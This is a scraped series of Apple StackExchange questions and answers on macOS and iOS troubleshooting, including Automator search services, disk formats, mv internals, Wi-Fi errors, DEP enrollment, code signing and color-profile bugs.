For one, if I am in Chrome it opens a new tab in Chrome and searches as I want. However, if I use this menu anywhere else in macOS, it uses Safari.\nThe system itself has the Services sub-component listed under Keyboard preferences or under the Finder menus. The Services sub-component lists lots of right-click menu items but does not let me change them. It lists \"Search Google for\", but it does not allow any customization.\nHow can I change this menu? I don't want Safari to open when I search.\n\nA: This appears to have been answered on stackoverflow already and on SuperUser even earlier.  \nThe \"search with google\" entry is added by safari and therefore cannot be edited.  So the solution is to disable that one, create your own service using automator, and then assign the appropriate shortcut key that will take precedence over the built-in disabled one.  This is actually what I was going to suggest until I found that someone else had already gone through it.  \nI've copied/pasted answer from SO here.\nInstructions:\n\n\n*\n\n*Open Automator and choose Service as the type\n\n*Add a \"Run Shell Script\" action by dragging it to the right pane\n\n\n\n*Add script\nopen \"http://www.google.com/search?q=$(ruby -rcgi -e 'print CGI.escape $<.read.chomp')\"\nAdjust the TLD as needed for your country specific Google page. ex: http://www.google.co.in/search?q=\nA comment to the SO answer suggests - instead of \"Run shell script\" you can also use \"Run javascript\", use script function run(input, parameters) { return \"google.com/search?q=\" + encodeURI(input) }, and stack additional action \"Internet > Open webpages\" underneath. It could work faster. Also see SU answer \n\n*Save the service as \"Search Google\"\n\n*Activate the service in System Preferences and optionally assign a keyboard shortcut. Once activated, \"Search Google\" will appear in the context menu\n\n", "Q: Is there a way to get macos to recognize my external hard drive without rebooting the operating system?

Also, exFat does not seem to be a reliable file system, so I searched for alternatives, but apart from fat32, exFat and ntfs I don't see any viable alternatives for a reliable cross-platform file system. \nAll of these formats have issues: fat32 has file size limits, exfat veracrypt partitions are not mountable on macos, and ntfs is proprietary, linux support is not reliable, and veracrypt does not support it on linux/mac. hfsplus works fine on mac but is read-only on linux. I hoped to be able to use ext3/ext4 with veracrypt encryption but even though I have fuse with ext4fuse working in read-only mode working for unencrypted drives veracrypt is apparently not able to interoperate with fuse drivers.\nFat32 would be a great option since it works well with veracrypt on any OS, but the file size limitation and lack of symlinks is simply not acceptable.\nAny other options I might have missed?\n\nA: Veracrypt+exFat works on Mac/Linux/Windows. The problems with mounting on MacOS were caused by configuring veracrypt encryption for the entire disk rather than a single partition. As a result the partition table was encrypted too. While this worked fine on linux it caused problems on MacOS. Creating a normal unencrypted partition table with an exFat partition and then encrypting that partition with veracrypt works fine cross-platform.\nThe downside is that Apple's exFat driver does not always cleanly unmount the partition which in turn unconditionally triggers exfatfsck on the next mount attempt and that can take hours to finish for large size disks.\n", "Q: Can Siri be instructed to scroll pages for me in Safari? I’m curious if I can do some hands free browsing through Siri. How integrated is Siri with Safari?\n\nA: In my honest opinion, using Siri on the Mac is extremely frustrating and has huge limitations.

I have a 2009 Mac Pro and am curious about whether or not I can put two of the stock video cards in it. My friend has an identical Mac Pro, but has a better video card. I could put his old stock one in mine if I wanted. I'm wondering if I can combine my card and his to get roughly twice the video performance? Or would that not work, since that little bridging thing isn't there?\nThanks!\n\nA: I'm assuming you have a Mac Pro 4.1 or 5.1 which uses a Nvidia GT 120 which on its own does not support SLI. When you referenced the technology that can be used to utilize multiple graphics cards, that is SLI for Nvidia and Crossfire for AMD.\nSince you have an Nvidia card, you would use SLI but there are a few problems with it:\n\n\n*\n\n*Your motherboard does not support SLI. In addition to a hardware bridge on top of the cards, SLI needs a motherboard that supports it too.\n\n*SLI requires that both cards are identical with the same chip.\n\n*To the furthest extent of my knowledge Mac OS does not support SLI.\nIf you want to upgrade, I know that people have used GTX 660s on the Mac Pro, but not anything after that.\n", "Q: Mount external disk at the same mounting point in macOS I have an external disk, and I want to be mounted in the same mounting point (path) every time I connect.\nIn ubuntu I edited the file /etc/fstab, I added\nUUID=5C2A-23AD /media/external1/    exfat        nofail,auto,noatime,rw,user 0 0\n\nand is working.

I'm attempting to copy song from iTunes to my iPhone.  All versions of software are current.  Trying to drag-and-drop from iTunes into my iPhone.  This was simple at some point in Apple history.  Now, nothing happens.  The \"traveling\" icon (drag/drop) tells me there is 1 file being  transfered, but no transfer ever takes place.  An hour chatting with Apple Support with all their versions of \"are you sure it's plugged in\" from their troubleshooting clones got me nowhere.  \n\nA: I had the same problem, trying to use drag-and-drop (as I'd always done) to add a media file (audiobook) to the iPhone. \nWhen dragged to the iPhone, the item appeared in a small gray box with a red/white number such as \"58.\" No idea what the number meant. In any case, I now know that the small gray box with the number is a visual cue that the dragged item will not be transferred to the phone.\nAfter setting preferences to manual synch, this worked for me on a PC:\n\n\n*\n\n*Connect the device to iTunes.\n\n*Select the device at the top of the screen (not in the sidebar). The iTunes Library view is replaced with your iphone view for \"Settings\" and \"On My Device.\"\n\n*In Settings>Summary, scroll to Options and check-in (or out) Sync your synching method.\n\n*In Settings>Audibooks, check-in \"Selected audiobooks.\" No need to actually select books from the list.\n\n*Switch back to regular iTunes Library (at the top of the screen, click the \" < \" (back arrow).\n\n*From the Library, select the media type and show it in grid view.\n\n*Select the grid item (tile?) for the media file you want to transfer. \n\n*Drag the item to the iphone. If drag-and-drop is working, then the entire iPhone and expanded content will be enclosed in a blue box.\n\n\nNotes\n\n\n*\n\n*After completing all of the steps, on the iphone, I had to leave \"Synch\" (see step 4, above) checked in. If I unchecked it, then all selected types of media were deleted from the iphone. \n\n*My environment: iPhone 10; Windows 10; software for both is up-to-date.\n\n\nApple updates its applications' behaviors more frequently than I transfer files. Consequently, figuring out what's changed and writing the steps for yourself seems to never be sufficient.\nHaving said that, I hope this helps at least a few people in the short term.\n", "Q: Applescript : text delimitation in a loop I'm trying to get values from a log file of all the occurrence of a value \nRecorded on the following key :\n> <key>MyTime</key>         <string>2019-03-29T08:48:18+0000</string>\n>       <key>serviceToken</key>\n\nI can get the first occurrence of the value I want with the following code, but how can I search for more occurrence and add in secondary variable ?\n##Getting the file name\nset ShortDate to short date string of (current date)\nset [dayN, MonthN, YearN] to the words of ShortDate\nset myUSDate to YearN & MonthN & dayN as string\nset myFileName to \"TIME\" & myUSDate & \".log\"\n\nset p to \"/Users/kevin/Library/Logs/MyAPP/\" & myFileName\nset plistfile_path to POSIX file p\n\nproperty leftEdge1 : \"<key>myValueTime</key>\"\nproperty rightEdge1 : \"<key>serviceToken</key>\"\nset myNewCaseNote to \"\"\nset newFile to (plistfile_path as text)\nset theSource to read file newFile as text\nset theText to Unicode text\ntry\n    set saveTID to text item delimiters\n    set text item delimiters to leftEdge1\n    set classValue to text item 2 of theSource\n    set text item delimiters to rightEdge1\n    set myCaseNote to text item 1 of classValue\n    set text item delimiters to saveTID\n    myCaseNote\nend try\n\nBut how can I get other occurrence of this time/data ? And not only the first one\n\nA: An XML file can’t have identical keys at the same level, so I’m going to guess that it is just a plain text file with those entries.\nText item delimiters can be used for everything, but it would tend to add a bit more code, since you would need to get a list of items using the first delimiters, then use additional delimiters on those items, and so on.  In this case, you can use them to just break the text apart at the desired key, then get the text from between the first set of tags by getting their offsets, for example:\nproperty keyValue : \"<key>myValueTime</key>\"\nproperty startTag : \"<string>\"\nproperty stopTag : \"</string>\"\n\nset theSource to \"<key>myValueTime</key>        <string>2019-03-28T08:48:18+0000</string>\n<key>serviceToken</key>\n<key>myValueTime</key>\n  <string>2019-03-29T09:48:18+0000</string>\n<key>serviceToken</key>\n  <string>whatever</string>\"\n\nset saveTID to text item delimiters\nset text item delimiters to keyValue\nset classValues to text items of theSource\nset text item delimiters to saveTID\n\nset myCaseNotes to {}\nrepeat with anItem in classValues\n  set here to (offset of startTag in anItem)\n  set there to (offset of stopTag in anItem)\n  if here is not 0 and there is not 0 then\n    set the end of myCaseNotes to text (here + (count startTag)) thru (there - 1) of anItem\n  end if\nend repeat\n\nreturn myCaseNotes\n\n", "Q: iterm3 reverse minimal theme compact style When my term updated to its latest version (Build 3.3.0beta1), it removed the titlebar from the window. \n\nApparently iTerm's theme is now: minimal.

On the same drive I assume it would change something like a FAT table to repoint to the location of files.\nQuestion\nWhen going to a different drive (maybe even partition) does the mv command first copy, then remove the old files - in order to prevent data loss if an exception occured ?\n\nA: Yes, you're right in thinking that moving a single file on the same file system is really just implemented as a rename operating that the file system structure is changed to update the new name/location of the file, but the file contents are not read/written to the drive again.\nWhen the move happens across two different file systems (drives or partitions), then the mv commands first deletes the destination (if there were an old file there already), copies over the contents of the file to the destination and then finally removes the source file. \nThe behavior is explained in the manual for mv on macOS:\n\nAs the rename(2) call does not work across file systems, mv uses cp(1) and rm(1) to accomplish the move.  The effect is equivalent to:\nrm -f destination_path && \\\ncp -pRP source_file destination && \\\nrm -rf source_file\n\n\nIn regards to the other answer that compares this behavior with the FreeBSD source code - the mv command on macOS is actually a bit different than on FreeBSD. In particular it makes sure that extended attributes and resource forks are moved over correctly and do not disappear when moving across file system boundaries.\nYou can read the actual macOS source for mv.\nYou'll see that it is similar in structure as the FreeBSD version, but contains various Apple specific enhancement. In addition to the functionality regarding extended attributes and resource forks as described above, it also has performance enhancements for use with Xsan (distributed file system).\nYou'll find in the code that first a rename is attempted:\nif (!rename(from, to)) {\n    if (vflg)\n        printf(\"%s -> %s\\n\", from, to);\n    return (0);\n}\n\nIf this rename() fails, the code checks why it failed. Especially it checks for the error number EXDEV, which means that the rename would have crossed file systems, and thus cannot be done:\nif (errno == EXDEV) {\n    struct statfs sfs;\n    char path[PATH_MAX];\n\n    /* Can't mv(1) a mount point. */\n    if (realpath(from, path) == NULL) {\n        warnx(\"cannot resolve %s: %s\", from, path);\n        return (1);\n    }\n    if (!statfs(path, &sfs) && !strcmp(path, sfs.f_mntonname)) {\n        warnx(\"cannot rename a mount point\");\n        return (1);\n    }\n} else {\n    warn(\"rename %s to %s\", from, to);\n    return (1);\n}\n\nNote here that this code aborts the move in case that the source contains unresolvable symbolic links, or if it is actually a mount point - and also generally if the rename() fails for other reasons than EXDEV.\nOnly in case that rename() fails with error number EXDEV, and not for the above mentioned reasons, the following code is run:\n/*\n * If rename fails because we're trying to cross devices, and\n * it's a regular file, do the copy internally; otherwise, use\n * cp and rm.\n */\nif (lstat(from, &sb)) {\n    warn(\"%s\", from);\n    return (1);\n}\nreturn (S_ISREG(sb.st_mode) ?\n    fastcopy(from, to, &sb) : copy(from, to));\n\nThis code branches out to do the move between file systems in two different ways depending on whether or not the source to be moved is actually a regular file - or it is something else. \"Something else\" is usually a directory, a symbolic link, a device node or similar.\nIn case of a regular file, it uses fastcopy() which simply opens the source and destination files, read()s the data from the source and write()s them to the destination. Unlike the FreeBSD version, the fastcopy() function uses fcopyfile() to copy over ACLs and extended attributes from the source to the destination.\nIn case of something that is not a regular file, it simply spawns external commands to perform the move: cp for copying and rm for deleting.\n\nA: macOS's mv is based on the BSD source code. You can find the source code to the mv command online. Using https://github.com/freebsd/freebsd/blob/master/bin/mv/mv.c as a reference, you can see that they do indeed first try to rename the file and then if it is crossing filesystems, it does a cp followed by a rm.\n    /*\n     * If rename fails because we're trying to cross devices, and\n     * it's a regular file, do the copy internally; otherwise, use\n     * cp and rm.\n     */\n    if (lstat(from, &sb)) {\n        warn(\"%s\", from);\n        return (1);\n    }\n    return (S_ISREG(sb.st_mode) ?\n        fastcopy(from, to, &sb) : copy(from, to));\n}\n\n", "Q: Allow find command to access my files I'm trying to use the find command to find a file on my Mac.

The company I work for is in the process of enrolling all iPads into MDM and correcting devices not in the DEP.\nWe've found one that we've had for a while. It's in another DEP but not in another MDM... So we are prevented from adding it our DEP but we have nobody to contact about correcting it. We contacted Apple with no results. Nobody has a serialized proof of purchase, the device wasn't asset tagged properly whenever it was acquired.\nMy best guess was that somebody independently bought a refurb unit from a third party seller. \nHow can I go about properly cataloging this into our DEP?\n\nA: The organization that owns the device is normally the only entity that can release it. You can watch the traffic without impacting it but not really get around the enrollment process without a solid jailbreak and some network skills. \n\n\n*\n\n*Can iPad SSL/TLS traffic be inspected during DEP enrollment?\nI would start with network packet capture / tracing to confirm which entity has convinced Apple to exert DEP control by logging DNS lookups or packet capture and not even pester Apple if you can't document your request in specific detail. \nIf there is a clear mistake, the other third party will they will likely want to help you out or at least learn more about this hardware. \n\n\n*\n\n*you either will be reporting a stolen device to them or they will learn they messed up releasing that device. \n\n*It’s also remotely possible there was a serial number mixup and they can contact Apple with you to fix that. \n\n\nSome day they could need someone else’s help and they wouldn’t want to manage your machine or be liable for infringing on your rights if they know hey are improperly managing someone else’s hardware. It's just the right thing to do if you ended up with someone else's registration in your console.\nNext, if you really had to you would work with Apple and be clearer and more thorough and patient than the first time you asked for help. You will be seen as potentially someone looking to steal someone else’s hardware since Apple goes to pretty long lengths to validate a company before they allow DEP and the odds of mistakes that can’t be caught are low. \nWorst thing - even if you accomplish your goal, I doubt you will ever be able to DEP that serial that was enrolled once and released. I’ve never heard of an exception to this. Maybe Apple would budge, but the warnings the releasing company sees before they release are quite dire and clear there is no going back once they rescind your/their one time DEP enrollment of a serialized product Apple sold to a validated business account. \nYou are likely going to have a long, hard  and unproductive experience with either a third party or Apple without specific documented proof a mistake was made.

Please try closing the FaceTime app. Then see what happens when you receive an incoming call. For me, an incoming call will shuffle me to the desktop where the FaceTime app is displayed, but if it's not open, I just get the notification in the upper right corner with no desktop change.\n\nA: In order to get the assign desktop options as shown above, you'll have to have multiple desktops open. Three finger gesture swipe up, add a desktop (+ right side of screen), right click FaceTime app to bring up options, you should be able to assign to all desktops now. I assigned to all desktops and it no longer switches when I get a phone call now - just the notification.\n", "Q: MacBook Pro won't connect to Wi-Fi, with correct password. Error: \"The Wi-Fi network requires a WPA2 password\" I'm trying to connect to my home Wi-Fi. When I enter the correct password, I get the message\n\nThe Wi-Fi network requires a WPA2 password\n\nI verified the password is correct in my router configuration.\nI am using a 2017 MacBook Pro, running macOS Mojave 10.14.2.\nI restarted my modem/router combo, restarted my MacBook, tried removing the home Wi-Fi and re-adding it (under System Preferences → Networks → Advanced → Preferred Networks), and changed the Wi-Fi password. Nothing works. My Wi-Fi name (SSID) doesn't have any special characters either.\nI have another 2015 MacBook Pro and an iPhone that can connect to my home Wi-Fi with no problems. So, it seems issue seems to be particular to this device (the 2017 MacBook Pro) in combination with my home network. This device has no problems connecting to other Wi-Fi networks (it works successfully at my office, at the airport, other homes, etc.)\nHow do I resolve it?\n\nA: I just had the same issue.  The answer I found online said to go to system preferences, then network, then click advanced and then click TCP/IP and click the Renew DHCP Lease; but I don't think that did anything.\nHowever, instead of clicking TCP/IP, stay on the Wi-Fi page (or go back to it by clicking the tab) and click the + button to add the network.  You need the network name and password, and for security I chose WPA2 personal.  Apply or Click OK and that should do it.  It worked for me and now I get connected automatically.\n\nA: I had the same issue like you and  I found a solution. In my case I have connected a  USB 3.0 hub to my 2018 Mac mini, so macOS adds this hub like other network settings.\nIf you disconnect you hub or another device that macOS detects like a network port, the WiFi works fine, but to remain connected with the hub or some device, go to System Preferences/Network and set inactive the devices that show this window (USB, Hub, Thunderbolt, etc.), and with this now my WiFi works fine.\n\nA: I'm betting the same SSID used a different encryption mechanism previously.\nGo to System Preferences ->Networks ->Advanced and remove the SSID from \"Preferred networks\" by selecting and clicking \"-\"; Turn off \"Remember networks this computer has joined\"\nThen reboot, go to the Wi-Fi icon in the menubar (top right of your screen), select the SSID when it comes up. Enter your password and hopefully all will be well.\nIf that doesn't work, please try changing the SSID on your Wi-Fi modem/router, being certain that the SSID is unique. While you're at it, upgrade to 10.14.4 since there were a few, seemingly unrelated, Wi-Fi issues corrected.\nPlease do share what your SSID is. I'm betting your machine has \"remembered\" another Wi-Fi network with the same SSID, but different encryption method.\n\nA: I don't know if you've resolved your issue but this is how my problem was resolved.\nI have a BT Homehub router so the settings (in \"advanced\" tab) allowed me to 'separate' the 2.4GHz and 5GHz channel settings which resulted in 2 SSIDs being visible on the network. The 5GHz channel was recognisable from the addition of \"-5\" being added to my original SSID. I connected to the 5GHz channel without any problem.\nIt seems my issue was an inability for my MacBook air to connect to the 2.4GHz channel.\nHope it works for you too!\n\nA: I am suddenly getting this problem with hardware that has been fine for a couple of years.

All my windows and android devices had no issues with connectivity. I had tried changing WPA2 to WPA2/WPA mode and from AES to TKIP encryption, forgot network in Mac Wifi settings, but nothing was helping. Then by chance I had found a similar post about WMM and the key was to set Enable WMM No-Acknowledgement to Disable and everything started to work like a charm. This option turned out to be essential for successful 2.4Ghz network association on Asus Mac routers. My advice is to play around with the WMM (Wifi Multimedia) settings of your router so see if it will help.\n\n\nA: I had a similar problem noted herein. I had tried all above with no luck. It then occurred to me that sometimes the KeyChain for a given password (in this case to the SSID on my router) gets corrupted or some such problem. I went into KeyChain, deleted the entry for the SSID for my router, and then all was well; upon netr trying to login using that SSID, I could once get in again.\n\nA: This is what worked for me: My router allows both 5G and 2.4G WLAN interfaces. It seems you are supposed to only set one of them with full WPA2 encryption, so you end up with 2 options:\n\n*\n\n*Disable 2.4G WLAN and setup 5G WLAN with WPA2 only\n\n*Keep both but one of them has to be WPA/WPA2 encrypted (which is less secure)\n\nOddly enough, other Macs at home didn't have an issue connecting when both WLANs were full WPA2\n\nA: I had the same problem. \nIt happened today and my other devices are fine.

I'm on macOS 10.12.6.\n\nA: The logic is simply that the file names you're looking at are sorted numerically. Finder takes the file names and note that they start with a number - everything up to first non-number character is then sorted numerically. \nI.e. from your example 9873613 < 13480567 < 39758380 < 46432537 < 81233033.\nNote that some files have 7 digits, others have 8 digits.\nIn general Finder's sorting takes sequences of numeric digits and treat them as a single number to be sorted. Non-numeric parts are sorted alphabetically like you would expect. This system of collation is called \"natural sorting\".\n", "Q: Merge multiple Time Machine backup disk images My MacBook Pro typically backups to my iMac Time Machine server.

How many files exist in one snapshot? Since you have hard links to contend with and protective permissions that prohibit most write operations, I would presume most attempts to construct a working hybrid will fail. \nThe failure modes likely are:\n\n\n*\n\n*insufficient iops to get the job done in months to longer timeframe. \n\n*insufficient sophistication handling the unpublished checksum handling of when a backup has been tampered with or just failed to be successful. \n\n\nI would love for someone to prove me wrong, but please make a backup copy of your backups if your main goal is actually preserving their viability. It’s likely you will be able to recover data from any tampered backup, but less likely you’ll be able to continue using a merged backup to make new backups. If that happens you now have another set and are further forked. \n\nA: There is no 'officially supported' way: by which I mean that Apple has provided no methods and no documentation for doing so.\nSimilar questions have been asked here many times, and only one of them has provided any possible solution, which is to copy one disk onto a third empty drive using SuperDuper!, and then copy the 2nd TM backup onto the third drive using option in SuperDuper! to copy only the files that are different, without erasing.\nNote that this method is probably not supported by SuperDuper! either, and the integrity of your merged backup will be unknown. \nYou may also need to 'inherit' the new merged backup using tmutil inheritbackup /path/to/backup to get the Mac to recognise the backup as its own.\nIt is much safer just to keep the two backups separate (or continue backing up to both), and then browse through the relevant one when you need to restore something.\n", "Q: Cannot install Mac OS X Lion due to disk errors I’m trying to install Mac OS X Lion after accidentally having erased my disk in order to reboot my iMac, which I did without backing it up. On a separate USB drive, I formatted and installed a Lion DMG file in order to reinstall the software back onto my computer, which currently starts up recovery mode because of my missing OS.\nIn order to download my OS from my USB into my hard drive, I believe I need to partition and erase my drive, however I get the error that the disk cannot be unmounted, most likely because the volume is being used? I have tried forcing the disk to unmount several times and have been stuck on this issue for days.\nPlease help. I just want to use my computer normally.\n\nA: If you were to purchase Lion from Apple, then a requirement to install would be to have Snow Leopard already installed. In other words, the DMG file only offers an upgrade to Lion. You probably can not use the DMG file to create a bootable installer. You can read the requirements from this Apple website.\nYou would not need a Apple ID to install Snow Leopard, but the installer will still ask. You can decline to give an Apple ID if you wish. Snow Leopard was released on a DL DVD. Apple still sells Snow Leopard DVDs, but you can also download an ISO from the internet. There are plenty of websites that explain how to make a bootable USB Snow Leopard installer. I have not tried any of these methods. If you succeed, then maybe you could post a method that works.\n\nI would recommend burning the Snow Leopard ISO file to a DL DVD.\n\nOnce you have Snow Leopard installed, you should install all the available Snow Leopard updates. This would update Snow Leopard to OS X 10.6.8. From here, you could upgrade to Lion by using your DMG file. Or, you could open Safari and search for the Apple website where you can download a free upgrade to El Capitan. \n\nNote: You may need an Apple ID to download El Capitan. If so, then use an existing Apple ID or create a new ID. Apple does not charge for creating new Apple IDs \n\n\nA: Hold down Command + R as you boot your Mac. This will cause it to boot into recovery mode. See the Apple Support document, About macOS Recovery\nWhen you're in recovery mode, a stripped version of the OS is loaded into memory, so you should be able to format your drive and perform an install. \nMac OS X Lion is ancient at this point. It would be great to know which iMac you have and why you're still running Lion. Is it a PowerPC based Mac?\nAlso, do you have Internet access? Most recent Mac's will download the latest OS if you go directly to reinstall macOS. Normally that's the best bet all around.\nLet me also ask...because you pretty much have to be LOOKING and looking HARD for trouble to erase your disk on a Mac, how did you \"accidentally erase your hard disk\"?\n", "Q: Why is Photo Stream not visible in iOS 12? I have an iPhone 6s running iOS 12.1.4, and I recently noticed my photos are not being uploaded to Photo Stream. There is no option for Photo Stream under Settings app → Account → iCloud → Photos, nor under Settings app → Photos. Did this option get removed in iOS 12?\n \n\nA: After speaking with Apple, I learned they are phasing out Photo Stream.  Any new Apple IDs created since approximately 2018 don't have access to this feature.  Looks like I will have to start using iCloud Photos or some other sync utility.\nhttps://support.apple.com/en-us/HT201317\n\nA: I went ahead and purchased a 2 TB cloud storage from Mac world for about $60, but later found out there are better storage solutions available.  Now I have to figure out how to synchronize my photos with all devices using this storage solution. I didn’t realize photo stream was being phased out, I really liked the convenience.\n", "Q: Can I Pair an Apple Wireless Keyboard with multiple iOS devices (not simultaneously) without ‘forgetting’? I just want to be able to switch my Apple Wireless Keyboard (latest) between my iPhoneX and iPad Pro without having to forget the last used device.\nBoth iOS devices are running the latest iOS. Not sure if inherently possible, or by app or hack.\n\nA: The keyboard does support been paired with multiple devices at the same time. However, there's no \"switch\" to toggle between devices - neither a physical switch nor a software switch in an app or similar.\nThe only way to make sure the device you want to use is the one currently communicating with the keyboard is to ensure that it is the only one within Bluetooth range.\nIf your phone stays in your pocket, it is not that practical to get that device out of the range of the keyboard. A \"hack\" is then to simply disable Bluetooth on the device that you do not want to use with the keyboard with currently. When you want to switch devices, disable Bluetooth on the current device, and enable it on the device that you want to switch to. The keyboard usually switches over in the matter of seconds.\nIf you wanted to use Bluetooth for something else on either device, the above hack won't work.\nThere's no other solutions through third party apps or similar.\n", "Q: Turn off the camera shutter sound on iPhone SE running iOS 12.1.4 I need to take a picture silently. Currently the only way I've found to silence the shutter sound is to enable Live Photo.\nMy iPhone 5s on iOS 10.x obeys the ringer/silent switch setting, but the following methods reported around the Web do not appear to work for my iPhone SE running iOS 12.1.4:\n\n\n*\n\n*Enable silent mode\n\n*Turn down the sound effects volume in the control center\n\n*Turn down the ringer volume\n\n*Turn off screen lock sounds\nNo combination of the above produces the desired effect; the shutter always sounds unless Live Photo is enabled.\nAm I missing something? As far as I know this phone has a European firmware.\n\nA: You found one of the methods, Live Photo.\nThe other is simply to turn the ringer sound down to zero.\nSource - Lifewire - How to Turn off the Camera Sound on iPhone\nI think the limitation on the ringer mute no longer working is because of recent legislation. No longer is 'upskirting' merely deeply offensive, it is now actually illegal.\nThat there is still a workaround is possibly an oversight & may be fixed in future.\n", "Q: How mount vhd on mac? I have some vhd files that are fixed size. \nDoes anyone know how to mount a fixed-size vhd on Macos?\n\nA: On a Mac, to mount a vhd , it is safer to be of fixed size, using \"/usr/bin/hdiutil\" according to \n\"/usr/bin/hdiutil attach -imagekey diskimage-class=CRawDiskImage  /path_to_your_vhd\"\n\nA: Simply rename to \".img\" and double click. It will mount and you can read and write to the vhd. Then \"eject\" after your work is done and rename the file back to \".vhd\". Works like a charm!\n", "Q: How can I change the default delay time before automatic shutdown? \nI don’t want to change the default delay time before shutting down all the time, but on occasion I want it to be 10 seconds and still show the dialog. \nThe only documentation I could find was for scheduled shutdown, which is not useful in my case unless someone can show automation to get the current time and schedule it for now plus 10 seconds. \nIs this doable with a tool or script to replicate the warning dialog and 10 second timer?\n\nA: There are a couple of workarounds for this, one of which I discovered by accident some time ago - though it doesn't give you 10 seconds, it's almost instantaneous.\nIf you set a shortcut key for \"Shut Down…\" the Apple Menu will add another option, \"Shut Down\" [without the ellipsis]. This one doesn't present that dialog at all, it just shuts down.\nThe same applies to Restart…\n\n\nYou can achieve the same by holding  Opt ⌥  whilst the Apple menu is open. All the options that would normally present an \"Are You Sure?\" dialog will be actioned without it - you see the ellipsis disappear with  Opt ⌥  held.\n", "Q: Is it allowed to be an Apple trusted developer with pure Java I am developing JavaFX with Spring applications that are shipped with native installers for Windows, Linux and macOS. I am hosting the macOS DMG and pkg installers outside Mac App Store on my web site.\nWhen I download and attempt to install a DMG on my macOS Mojave, the latter forbids to install because the app is not from a trusted Apple developer. Downloading the same installer from FTP is allowed by Mac to be installed.\nMy question is - Can I have my package installer signed (by registering as an Apple developer) if the application is purely Java and has nothing to do with Apple specific SDKs?\n\nA: Basically if I understand your question - yes, it’s allowed, but might not be required.\nWhen you pay to be a developer, Apple generates a secure certificate you can use for many functions - one of which is to code sign a folder of files. Applications on macOS are just bundles of files with some conventions which files make something a package or an app. You can sign a script, package,  interpreted code bundle or a compiled app.\n\n\n*\n\n*https://developer.apple.com/documentation/security/notarizing_your_app_before_distribution\nApple is offering additional items like notarizing an app but you should be able to sign your example app with a self-generated certificate before you pay for Apple to sign / provide your identity that all of their devices and OS will trust as valid.\n\n\n*\n\n*https://developer.apple.com/documentation/security/notarizing_your_app_before_distribution\nTo recap, you pay for an identity that Apple validates. Of course if you abuse this, your certificate can and should be revoked but as long as you are signing legitimate apps you should expect to only have to pay annually for a renewal of your certificate. This is pretty much analogous to getting an SSL cert. You pay for those periodically, and then the signer generally doesn’t care why / where you install that cert - as long as you don’t break their rules and get caught, they don’t revoke your certificate.\nNow - if the java executable gets notarized and signed by someone else, you might not need this at all and you’re not embedding executable bits and just resources and text or source code. For example, it doesn’t make sense to pay if you write swift scripts or python scripts or bash (or other shell) scripts. That would be like code signing a word doc and not word the program itself.\n\nA: Signing with Apple Developer ID worked out. DMGs and PKGs are created and installed just fine on MacOS, well up to version 10.14. From macOS 10.15 Apple made developers notarize their applications otherwise Gatekeeper will not allow them to be installed. I am using SnifX frameworks which simply creates and bundles via Maven a Spring-based Java application to a macOS DMG or PKG with a bundled JRE inside. The current status quo - Apple notarization attempts fail Java bundled applications due to \"Hardened Runtime capability\" and \"The binary uses an SDK older than the 10.9 SDK.\" issues on bundled Java binaries.\nFrom what I researched and attempted:\n\n\n*\n\n*The hardened runtime issue is fixed by enabling the corresponding option on the signing command : codesign --force --deep --options runtime -s 'Your Apple Developer ID' -v YourJavaBundledApp.dmg;\n\n*About \"SDK older than the 10.9 SDK\" - looks like it is required to unpack each Jar/Zip from JRE bundle and apply forced signing and then re-assemble the Jar/Zip. Maybe a better way exists, but this seams like another topic (how to notarize non-XCode applications with bundled runtimes inside)...\n\n", "Q: issues rendering images when using any icc profile (including apple's default). clipped dark areas. preview/quicklook shows wrong contrast Firstly: I know this problem has been around and recurrently emerges since around 2014. Many OSs and program updates happened since then. Some solved the problem (cfr. Lightroom version 5.7 that fixed the issue for some), some broke the toy again.\nI want to acknowledge some of those who have been writing and looking for a solution in the past years by sharing the links to those threads and thus the knowledge within them:\nBug? macOS Sierra Preview/Quick Look issues with rendering colors of images when using any icc profile other than the macOS standard\nhttp://lagemaat.blogspot.com/2014/01/serious-color-management-bug-in-mac-os.html\nhttp://lagemaat.blogspot.com/2014/08/further-quantification-of-mavericks.html\nhttps://feedback.photoshop.com/photoshop_family/topics/lightroom_5_icc_profiles_clipped_shadows_under_osx\nhttps://discussions.apple.com/thread/7411978?answerId=29674571022#29674571022\nhttps://forums.adobe.com/thread/1365804?start=80&tstart=0\nthis guy has a different take on the problem, stating that it could happen the OPPOSITE of what most are experiencing, which is: color managed applications showing wrong colors, not the other way around.\nhttp://www.gballard.net/photoshop/mac_color.html\nhttp://www.gballard.net/psd/colorlooksbad.html\n\nThe following is the bug report I submitted today to Apple, slightly edited\n\nIt seems that ColorSync (?) misinterprets color profiles.\nI had a similar problem in high Sierra with a LUT based ICC profiles made with DisplayCAL.\nI solved it by creating a simpler profile with the default \"colormunki photo\" software.\nThe problem is MUCH worse in Mojave. And it is worrying me (and other professional I believe).\nWith ANY ICC profile, including the original default profile, there is a notable difference between the image rendering within a) Photoshop, b) Lightroom (both library and develop module) and c) preview/quickview.\nIn very simple terms: you modify a (raw) picture in Lightroom, then you export it and open it in Photoshop and it looks different (in Photoshop shadows are smoother).\nThen you open the same image with Preview and darker values look clipped and color looks shifted.\nThe \"custom ICC profile\" in my long experience is always \"warmer\" then the default apple ICC profile. The interesting thing is that the color shift within Preview, when comparing it to Photoshop, is towards blue, almost complementary to the ICC profile change.\nI don't know how to interpret it, but it seems relevant.\nIt happens with sRGB and adobeRGB embedded profiles, so I think it's not an \"input profile interpretation\" but a \"monitor CMM\" issue.\nthe most troubling thing is that if you open a raw file in Lightroom/CR and its high resolution jpeg or tiff in Photoshop the images look different. This should not be.\nI tried with a 16-bit adobeRGB tiff and with a sRGB jpeg, with the same result: dark areas are more clipped in Lightroom then in photoshop.\nSome suggested that enabling soft-proofing in Lightroom to emulate the current monitor profile shows the correct color. I have tried it and it doesn't change a bit.\nAs a side note: when I experienced the problem years ago, in Mavericks/CameraRaw, disabling GPU for CameraRaw solved the mismatch. So I know it can be a GPU issue in some cases. Not this time.\nI tried with and with GPU acceleration enabled and disabled. Nothing changes.\nIt's a most serious bug. It means that I'm modifying the raw file in an arbitrary way because It's being displayed wrong. It makes working unpredictable.\nHours of editing being done in Lightroom, sometimes to export a deliverable (-> not a file to be further edited in PS), to realize that once opened in PS or printed they look different: that the client will print it differently.\nIt's a humongous issue.\nIt's so huge that I can hardly believe that every creative who uses an apple product and calibrates their monitor (as it should be) has this problem.\nSteps to Reproduce:\nPrerequisite:\nA.1) calibrate and characterize the monitor you are using: use any probe (colormunki, x-rite, Spyder etc), calibrate to 6500°K + 2.2 gamma + original luminosity, then characterize with the default settings. You can test both V2 and V4 ICC profiles. In my experience the rendering mismatch is 